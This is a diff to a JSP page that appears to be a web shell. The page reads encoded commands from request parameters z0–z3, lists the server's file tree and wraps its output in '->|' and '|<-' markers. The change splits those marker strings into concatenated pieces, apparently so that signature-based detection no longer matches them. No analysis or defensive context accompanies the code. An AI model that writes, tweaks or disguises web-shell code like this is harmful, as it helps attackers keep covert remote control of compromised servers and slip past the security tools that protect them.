@@ -336,7 +336,7 @@ ChangeLog:
         String z2 = decode(EC(request.getParameter("z2") + ""), encoder);
         String z3 = decode(EC(request.getParameter("z3") + ""), encoder);
         String[] pars = { z0, z1, z2, z3};
-        sb.append("->|");
+        sb.append("->" + "|");
 
         if (funccode.equals("B")) {
             sb.append(FileTreeCode(pars[1]));
@@ -376,6 +376,6 @@ ChangeLog:
     } catch (Exception e) {
         sb.append("ERROR" + "://" + e.toString());
     }
-    sb.append("|<-");
+    sb.append("|" + "<-");
     out.print(sb.toString());
 %>
